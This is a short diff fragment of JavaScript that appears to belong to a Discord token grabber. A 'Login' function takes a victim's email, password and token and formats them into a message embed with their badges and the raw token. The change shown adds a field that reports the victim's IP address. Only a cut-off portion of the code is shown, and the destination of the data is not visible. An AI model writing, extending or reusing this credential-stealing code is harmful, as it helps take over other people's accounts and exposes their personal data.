@@ -161,9 +161,16 @@ function Login(email, password, token) {
                                    
                                    <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                    "inline": true
-                                 },
-                                
 
+                                   
+                                 },
+                                 {
+                                    "name": "",
+                                    "value": `IP: \n${o}\n`
+
+
+
+                                },
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
